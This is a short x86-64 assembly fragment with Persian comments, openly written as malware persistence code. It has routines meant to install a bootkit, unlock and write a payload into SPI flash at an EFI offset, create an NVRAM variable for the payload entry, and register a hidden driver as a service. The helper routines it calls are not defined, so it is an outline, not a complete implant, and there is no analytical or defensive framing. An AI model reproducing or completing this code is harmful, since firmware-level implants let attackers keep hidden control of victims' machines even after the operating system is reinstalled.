; پایداری پیشرفته
section .text

install_persistence:
    ; پایداری سطح بوت
    call install_bootkit

    ; پایداری EFI
    call install_efi_persistence

    ; پایداری درایور
    call install_driver_persistence

    ; پایداری سرویس
    call install_service_persistence
    ret

install_efi_persistence:
    ; تزریق به حافظه SPI
    call unlock_spi_flash
    mov rdi, payload_image
    mov rsi, payload_size
    mov rdx, EFI_PARTITION_OFFSET
    call write_spi_flash

    ; ایجاد متغیر NVRAM
    mov rdi, VAR_NAME
    mov rsi, payload_entry
    mov rdx, payload_size
    call create_nvram_variable
    ret

install_driver_persistence:
    ; ثبت درایور مخفی
    mov rdi, driver_path
    mov rsi, SERVICE_NAME
    call create_service
    ret
    